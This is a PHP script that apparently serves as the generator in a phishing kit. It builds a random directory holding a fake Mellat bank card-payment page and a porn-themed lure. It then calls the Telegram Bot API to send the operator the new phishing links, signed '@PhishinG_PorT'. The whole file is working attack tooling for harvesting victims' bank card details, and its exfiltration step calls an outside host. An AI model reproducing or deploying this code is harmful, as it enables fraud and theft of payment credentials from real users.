<?php 


//CODED BY phoneix
if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}
//CODED BY phoneix
header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}



//CODED BY phoneix
$TOKENMS = stripslashes(htmlspecialchars($_POST['TOKEN']));
if(strstr($TOKENMS,'../source/')){
die('lfi and rfi detected');
}
$IDMS = intval(stripslashes(htmlspecialchars($_POST['ID'])));
if(strstr($IDMS,'../source/')){
die('lfi and rfi detected');
}

$re= "port";
$Rand=rand(10000,10000000); 
$TOKEN= '$TOKENESH';
$ID ='$IDISH';
mkdir($Rand);
$FileName = "$Rand/index.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
//Payment.mellat 
copy('../source/card.html', 'index.php'); 
copy('../source/tel.php', 'tel.php'); 
copy('../source/Start.php', 'Start.php'); 


//page 
copy('../source/porn.htm', 'porn.htm');

?>
<meta content='0;url=../ok.html'http-equiv='refresh'/>
<center><P>Loading</p></center>
<?php
?>
");
$FileName = "$Rand/Userid.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN ='$TOKENMS';
$ID = '$IDMS';
?>
");

$FileName = "ok.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
header('Location: $Rand/index.php');
?>
");
	
		echo "<div id=stl>


</div>
"; 

include"info.php";
$Text = "عملیات با موفقیت انجام شد ✅
User Name : $Rand
Port : #mastercard
➖➖
🌐 درگاه خام : 
$link/ir/$Rand/index.php
🌐 قالب های متصل به درگاه :

🔴 پورن هاب  :
$link/ir/$Rand/porn.htm

➖➖
⚠️ @PhishinG_PorT";
$ok =  file_get_contents("https://api.telegram.org/bot".$TOKENMS."/SendMessage?chat_id=".$IDMS."&text=".urlencode($Text));	
header('Location: ok.php');	

?>

 
	
